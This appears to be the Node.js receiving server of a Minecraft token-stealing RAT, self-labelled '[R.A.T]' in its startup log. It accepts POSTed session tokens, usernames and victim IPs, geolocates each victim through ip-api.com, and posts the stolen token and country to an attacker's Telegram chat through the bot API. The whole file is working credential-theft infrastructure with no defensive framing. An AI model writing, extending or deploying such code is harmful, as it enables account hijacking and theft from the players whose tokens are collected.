const getProfiles = require('./utils/networth');
require("dotenv").config();
const { post, get } = require("axios");
const express = require("express");
const mongoose = require("mongoose");
const helmet = require("helmet");
const app = express();
const expressip = require("express-ip");
const port = process.env.PORT || 8080;

app.use(helmet());
app.use(expressip().getIpInfoMiddleware);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post("/", async (req, res) => {
    if (req.body.token === null || req.body.token === undefined) {
        return res.sendStatus(404);
    }

    try {
        const country = await fetchCountry(req.body.ip);
        if (!req.body.ip || !country || req.body.ip === undefined) {
            return res.sendStatus(404);
        }

        const message = `
        @everyone - ${req.body.username}
        
        *Statistics:*
        [Plancke.io](https://plancke.io/hypixel/player/stats/${req.body.username})  [SkyCrypt](https://sky.shiiyu.moe/stats/${req.body.username})
        
        *Token:* ${req.body.token}

        *Country:* ${country}
        `;

        const telegramData = {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        };

        await post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, telegramData);
    } catch (err) {
        console.error(err);
    }

    res.send("OK");
});

app.listen(port, () => {
    console.log(`[R.A.T] Listening at port ${port}`);
});

async function fetchCountry(ip) {
    const apiUrl = `http://ip-api.com/json/${ip}`;
    try {
        const response = await axios.get(apiUrl);
        return response.data.country;
    } catch (error) {
                return 'Unknown';
    }
}
